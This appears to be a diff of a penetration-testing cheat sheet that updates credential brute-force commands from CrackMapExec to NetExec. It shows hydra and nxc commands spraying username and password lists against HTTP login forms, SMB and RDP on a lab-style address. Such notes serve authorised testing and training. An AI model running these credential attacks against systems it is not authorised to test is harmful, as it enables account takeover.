@@ -30,24 +30,24 @@ hydra -L users.txt -P passwords.txt smb://10.10.10.10
 
 ---
 
-## CrackMapExec
+## NetExec
 
 ### Web Authentication
 
 ```bash
-crackmapexec http 10.10.10.10 -u users.txt -p passwords.txt --auth-form /login.php
+nxc http 10.10.10.10 -u users.txt -p passwords.txt --auth-form /login.php
 ```
 
 ### SMB
 
 ```bash
-crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
+nxc smb 10.10.10.10 -u users.txt -p passwords.txt
 ```
 
 ### RDP
 
 ```bash
-crackmapexec rdp 10.10.10.10 -u users.txt -p passwords.txt
+nxc rdp 10.10.10.10 -u users.txt -p passwords.txt
 ```
 
 ---
